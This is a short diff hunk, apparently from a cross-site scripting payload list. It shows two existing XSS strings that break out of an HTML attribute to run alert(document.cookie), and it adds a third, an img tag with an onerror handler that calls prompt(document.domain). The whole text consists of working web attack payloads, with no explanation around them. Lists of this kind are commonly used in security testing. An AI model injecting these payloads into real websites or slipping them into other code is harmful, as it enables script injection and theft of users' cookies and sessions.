@@ -11,3 +11,5 @@
 "><a onmouseover="alert(document.cookie)">xxs link</a>
 
 ['-alert(document.cookie)-']
+
+"><img src=x onerror=prompt(document.domain)>
